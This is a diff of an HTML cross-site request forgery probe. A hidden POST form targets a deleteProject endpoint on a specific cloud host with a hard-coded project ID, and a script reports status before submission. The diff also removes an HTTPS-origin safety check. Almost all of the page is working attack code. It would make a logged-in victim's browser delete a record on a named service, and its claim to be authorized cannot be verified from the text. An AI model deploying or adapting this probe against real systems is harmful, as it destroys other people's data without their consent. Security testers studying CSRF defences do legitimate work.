@@ -1,31 +1,24 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Authorized multipart CSRF probe</title>
-<h1>Authorized multipart CSRF probe</h1>
-<p id="status">Preparing the disposable-record test...</p>
+<title>Authorized top-level CSRF probe</title>
+<h1>Authorized top-level CSRF probe</h1>
+<p id="status">Preparing request...</p>
 
 <form
   id="csrf-form"
   method="POST"
   target="_top"
-  enctype="multipart/form-data"
+  enctype="application/x-www-form-urlencoded"
   action="https://totalspendmanagement-smart-data-hub-smart-data-hub-ui-approuter.cfapps.eu10.hana.ondemand.com/cap_api/odata/v4/srv/deleteProject"
 >
-  <input
-    type="hidden"
-    name="PROJECT_ID"
-    value="660655de-d7ba-4ee1-a75d-c71d00b073e9"
-  >
+  <input id="project-id" type="hidden" name="PROJECT_ID" value="660655de-d7ba-4ee1-a75d-c71d00b073e9">
 </form>
 
 <script>
-  const projectId = document.querySelector('input[name="PROJECT_ID"]').value;
+  const projectId = document.querySelector("#project-id").value;
   if (projectId === "660655de-d7ba-4ee1-a75d-c71d00b073e9") {
     document.querySelector("#status").textContent =
-      "Replace TEST_PROJECT_ID with an approved disposable record before testing.";
-  } else if (location.protocol !== "https:") {
-    document.querySelector("#status").textContent =
-      "Publish this file on the authorized HTTPS test origin before running it.";
+      "Replace TEST_PROJECT_ID with the disposable test project's ID before publishing.";
   } else {
     document.querySelector("#status").textContent =
       "Submitting the authorized disposable-record test...";
